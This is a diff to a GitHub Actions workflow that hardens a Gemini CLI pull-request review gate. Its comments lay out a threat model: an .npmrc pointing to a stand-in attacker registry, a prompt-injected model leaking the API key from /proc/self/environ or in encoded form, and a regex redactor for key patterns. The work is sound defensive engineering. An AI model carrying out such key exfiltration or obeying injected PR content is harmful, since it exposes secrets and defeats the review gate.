@@ -38,11 +38,29 @@ runs:
 
     - name: Install Gemini CLI (pinned)
       shell: bash
-      working-directory: ${{ inputs.working-directory }}
+      # SECURITY: Do NOT cd into `inputs.working-directory` (the PR-controlled
+      # `review/` checkout) for the install. `npm` reads `.npmrc` from cwd; a
+      # malicious PR could ship `.npmrc` with `registry=https://attacker.example/`
+      # and the install would pull a compromised package. The next step then
+      # runs `gemini` with GEMINI_API_KEY in env — the output sanitizer can't
+      # defend against a malicious binary (it can exfil over network or stderr).
+      # Install from $RUNNER_TEMP (no .npmrc), force per-user and global config
+      # to forced-empty files, pin the registry explicitly.
+      #
+      # NOTE: the user-config and global-config paths must be DIFFERENT files.
+      # npm 11+ rejects loading the same file in both roles with:
+      #   "double-loading config '<path>' as 'global', previously loaded as 'user'"
+      # (Same bug landed in safe-docx then was caught here; the fix is portable.)
       env:
         GEMINI_CLI_VERSION: ${{ inputs.gemini-cli-version }}
+        NPM_CONFIG_USERCONFIG: ${{ runner.temp }}/llm-gate-empty-userconfig
+        NPM_CONFIG_GLOBALCONFIG: ${{ runner.temp }}/llm-gate-empty-globalconfig
+        NPM_CONFIG_REGISTRY: https://registry.npmjs.org/
       run: |
         set -euo pipefail
+        : > "$NPM_CONFIG_USERCONFIG"
+        : > "$NPM_CONFIG_GLOBALCONFIG"
+        cd "$RUNNER_TEMP"
         npm install --silent --no-audit --no-fund --global "@google/gemini-cli@${GEMINI_CLI_VERSION}"
         gemini --version
 
@@ -52,25 +70,46 @@ runs:
       run: |
         set -euo pipefail
         mkdir -p .gemini
+        # Gemini CLI v0.39.x expects nested `tools.core` and `model.maxSessionTurns`.
+        # Top-level `coreTools` / `maxSessionTurns` is silently ignored, which
+        # would leave the gate running with default (broader) tool access.
+        # See: https://github.com/google-gemini/gemini-cli/blob/v0.39.1/docs/reference/configuration.md
+        #
+        # The allowlist is intentionally broad so the model can deterministically
+        # verify lint/spec/check claims via `npm run *` rather than only
+        # describing what it sees. Residual risks (and their mitigations):
+        #   - `.npmrc` poisoning during install: mitigated in the install step
+        #     above by running from $RUNNER_TEMP with forced-empty npm config.
+        #   - PR-controlled `package.json` redefining `npm run X`: mitigated by
+        #     the system-prompt guardrail directing the model to read script
+        #     definitions before invoking and refuse modified scripts; bypassable
+        #     by adversarial prompt injection but acceptable given the same-repo
+        #     gate (only org members can trigger the workflow).
+        #   - API-key exfiltration via the model's `.justification`: mitigated
+        #     by the output sanitizer below.
         cat > .gemini/settings.json <<'JSON'
         {
-          "maxSessionTurns": 50,
-          "coreTools": [
-            "read_file",
-            "list_directory",
-            "glob",
-            "grep_search",
-            "run_shell_command(git diff)",
-            "run_shell_command(git log)",
-            "run_shell_command(git show)",
-            "run_shell_command(rg)",
-            "run_shell_command(cat)",
-            "run_shell_command(ls)",
-            "run_shell_command(wc)",
-            "run_shell_command(npm run validate)",
-            "run_shell_command(npm run lint)",
-            "run_shell_command(npm run check:)"
-          ]
+          "model": {
+            "maxSessionTurns": 50
+          },
+          "tools": {
+            "core": [
+              "read_file",
+              "list_directory",
+              "glob",
+              "grep_search",
+              "run_shell_command(git diff)",
+              "run_shell_command(git log)",
+              "run_shell_command(git show)",
+              "run_shell_command(rg)",
+              "run_shell_command(cat)",
+              "run_shell_command(ls)",
+              "run_shell_command(wc)",
+              "run_shell_command(npm run validate)",
+              "run_shell_command(npm run lint)",
+              "run_shell_command(npm run check:)"
+            ]
+          }
         }
         JSON
         python3 -m json.tool .gemini/settings.json >/dev/null
@@ -119,11 +158,29 @@ runs:
         PARSED=""
         ATTEMPTS=0
         MAX_ATTEMPTS=3
+        LAST_RAW=""
+        LAST_ERR=""
+        DIAG_LOG="$RUNNER_TEMP/diag-${CHECK_ID}.log"
+        : > "$DIAG_LOG"
+
+        # Stagger concurrent matrix jobs so they don't fire their first LLM
+        # call at the same instant. With max-parallel > 1 the jobs in a wave
+        # otherwise hit the API simultaneously; a burst of large requests is
+        # what provokes rate-limit / quota / empty-response failures (observed:
+        # all checks returning empty JSON, retries firing ~6ms apart). Sleep a
+        # deterministic 1-5s keyed on the check id (so each wave's jobs are
+        # offset) plus a small random jitter to break any residual alignment.
+        STAGGER_BASE=$(( (10#$CHECK_ID - 1) % 5 + 1 ))
+        STAGGER=$(awk -v b="$STAGGER_BASE" 'BEGIN { srand(); printf "%.1f", b + rand() }')
+        echo "Staggering check ${CHECK_ID} start by ${STAGGER}s (avoid LLM API bursts)"
+        sleep "$STAGGER"
 
         for attempt in 1 2 3; do
           ATTEMPTS=$attempt
           RAW="$RUNNER_TEMP/raw-${CHECK_ID}-${attempt}.json"
           ERR="$RUNNER_TEMP/err-${CHECK_ID}-${attempt}.log"
+          LAST_RAW="$RAW"
+          LAST_ERR="$ERR"
 
           # Direct CLI invocation: we control logging, retries, and what
           # ends up in $GITHUB_STEP_SUMMARY. The official action would
@@ -134,7 +191,12 @@ runs:
               --output-format json \
               --prompt "$(cat "$PROMPT_FILE")" \
               > "$RAW" 2> "$ERR"; then
+            GEMINI_EXIT=0
+          else
+            GEMINI_EXIT=$?
+          fi
 
+          if [ "$GEMINI_EXIT" -eq 0 ]; then
             # The CLI returns {"response": "<model text>", "stats": {...}}.
             # Extract response, then parse it as our {status, justification} JSON.
             if MODEL_TEXT=$(jq -er '.response' "$RAW" 2>/dev/null) && \
@@ -143,12 +205,24 @@ runs:
                    and (.justification | type == "string")
                    and (.justification | length > 0))
                ' 2>/dev/null); then
+              printf 'attempt %d: ok (CLI exit 0, parsed)\n' "$attempt" >> "$DIAG_LOG"
               break
             fi
+            printf 'attempt %d: CLI exit 0 but response JSON did not match {status,justification} contract\n' "$attempt" >> "$DIAG_LOG"
+          else
+            printf 'attempt %d: CLI exit %d (no parse attempted)\n' "$attempt" "$GEMINI_EXIT" >> "$DIAG_LOG"
           fi
 
           if [ "$attempt" -lt "$MAX_ATTEMPTS" ]; then
             echo "::warning::Attempt $attempt for check ${CHECK_ID} produced malformed output; retrying"
+            # Back off before retrying (jittered, escalating: ~2-3s then ~4-5s).
+            # An empty/error CLI response returns near-instantly, so without a
+            # sleep the 3 attempts fire within milliseconds and just re-hit the
+            # same transient rate-limit/quota wall. Spacing the retries lets a
+            # transient condition clear before the next call.
+            BACKOFF=$(awk -v a="$attempt" 'BEGIN { srand(); printf "%.1f", a * 2 + rand() }')
+            echo "Backing off ${BACKOFF}s before retry $((attempt + 1)) for check ${CHECK_ID}"
+            sleep "$BACKOFF"
             # Append a short corrective note for the next attempt so the
             # model knows what went wrong.
             {
@@ -163,7 +237,60 @@ runs:
         if [ -z "$PARSED" ]; then
           echo "::warning::Check ${CHECK_ID} fell back to WARN after $MAX_ATTEMPTS malformed attempts"
           PARSED=$(jq -n '{status: "WARN", justification: "Unable to verify: the LLM produced malformed output across all retry attempts. Review this question manually."}')
+
+          # Surface the last-attempt diagnostic so we can root-cause why all
+          # retries failed (auth/quota, model availability, CLI/model
+          # incompatibility, response-envelope change, etc.). Bounded leak
+          # risk: only the model's error envelope and response head, never
+          # the prompt or PR diff.
+          if [ -n "${GITHUB_STEP_SUMMARY:-}" ]; then
+            {
+              printf '### Check %s — WARN fallback diagnostics\n\n' "$CHECK_ID"
+              printf 'All %d retry attempts failed. Per-attempt outcome:\n\n' "$MAX_ATTEMPTS"
+              printf '```\n'
+              cat "$DIAG_LOG"
+              printf '```\n\n'
+              if [ -s "$LAST_ERR" ]; then
+                printf '<details><summary>Last attempt stderr (head 4096 bytes)</summary>\n\n'
+                printf '```\n'
+                head -c 4096 "$LAST_ERR"
+                printf '\n```\n\n</details>\n\n'
+              fi
+              if [ -s "$LAST_RAW" ]; then
+                printf '<details><summary>Last attempt raw response (head 4096 bytes)</summary>\n\n'
+                printf '```\n'
+                head -c 4096 "$LAST_RAW"
+                printf '\n```\n\n</details>\n'
+              fi
+            } >> "$GITHUB_STEP_SUMMARY"
+          fi
         fi
+
+        # Defense in depth: redact GEMINI_API_KEY from the model's justification
+        # before anything downstream sees it (artifact JSON, PR comment, step
+        # summary). The output contract restricts the model to {status,
+        # justification} where status is a closed enum, so justification is the
+        # only freeform exfil channel. Two redactions:
+        #   1. Literal $GEMINI_API_KEY value — catches the most direct leak
+        #      (model echoes the env var verbatim from cat /proc/self/environ
+        #      or similar).
+        #   2. AIza-pattern (Google API key shape) — catches accidental
+        #      occurrences of other Google API keys that happen to be in the
+        #      diff or model's context.
+        # Does NOT defeat encoded exfiltration (base64, rot13, splitting). For
+        # that threat model we rely on (a) the same-repo gate in the workflow's
+        # `if:` block which restricts triggers to org members, and (b) GitHub's
+        # reactive secret scanning + key revocation as the final backstop.
+        SANITIZED_JUSTIFICATION=$(printf '%s' "$PARSED" | jq -r '.justification' | python3 -c '
+        import sys, os, re
+        data = sys.stdin.read()
+        key = os.environ.get("GEMINI_API_KEY", "")
+        if key:
+            data = data.replace(key, "[REDACTED-GEMINI-API-KEY]")
+        data = re.sub(r"AIza[0-9A-Za-z_-]{35}", "[REDACTED-API-KEY-PATTERN]", data)
+        sys.stdout.write(data)
+        ')
+        PARSED=$(printf '%s' "$PARSED" | jq --arg j "$SANITIZED_JUSTIFICATION" '.justification = $j')
 
         # Char-count cost estimation. Token counts aren't exposed by the
         # CLI; we approximate at 4 chars/token (industry rule of thumb).
